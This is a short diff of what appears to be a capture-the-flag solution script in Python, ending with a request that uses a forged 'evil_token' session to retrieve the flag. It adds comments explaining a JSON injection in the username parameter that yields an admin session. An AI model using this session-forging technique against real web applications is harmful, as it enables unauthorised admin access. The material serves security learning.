@@ -22,3 +22,8 @@ evil_token = json.loads(r.content.decode("utf-8"))["session"]
 # Retrieve flag using token
 r = requests.get(authorise(evil_token))
 print(r.content.decode("utf-8"))
+#solution
+#The script demonstrates a JSON injection vulnerability in a web application.
+#It constructs a malicious session token by injecting a payload into the username parameter. 
+#After the session is created, it extracts the malicious token and uses it to authorize an admin session. 
+#Finally, it retrieves the flag by sending the injected token to the authorization endpoint.
